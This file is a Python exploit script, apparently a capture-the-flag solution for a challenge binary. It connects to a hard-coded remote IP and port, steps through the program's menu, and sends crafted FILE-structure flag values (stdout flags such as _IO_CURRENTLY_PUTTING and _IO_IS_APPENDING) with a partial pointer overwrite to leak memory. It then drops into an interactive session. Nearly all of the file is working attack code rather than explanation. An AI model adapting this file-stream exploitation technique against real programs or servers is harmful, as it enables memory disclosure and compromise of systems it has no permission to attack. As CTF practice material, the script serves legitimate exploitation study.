#!/usr/bin/env python3.9
# -*- coding: utf-8 -*-
from rootkit import *

exe = context.binary = ELF('./chall')

host = args.HOST or '159.223.87.165'
port = int(args.PORT or 2)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

gdbscript = '''
tbreak main
continue
'''.format(**locals())

# -- Exploit goes here --

io = start()
sla(b"> ", b"3")
sla(b"> ", b"A")
sla(b"> ", b"1")

flag = 0xFBAD0000 #magic
flag|= 0x2000 #filebuf
flag|= 0x0080 #linked
flag|= 0x1 # userbuf
flag|= 0x4 # no_read
flag|= 0x0200 # IO_LINE_BUF
print(hex(flag))
c = p64(flag)
c+= b"\xb8\x86"
c+= b"\n"

sla(b"> ", c)
input()
flag = 0xFBAD0000 #magic
flag|= 0x2000 #filebuf
flag|= 0x0080 #linked
flag|= 0x1 # userbuf
flag|= 0x4 # no_read
flag|= 0x0800 # _IO_CURRENTLY_PUTTING
flag|= 0x1000 # _IO_IS_APPENDING

c = p64(flag)
c+= b"\n"
time.sleep(0.1)
sl("1")
time.sleep(0.1)
sl(c)
print(re())
io.interactive()

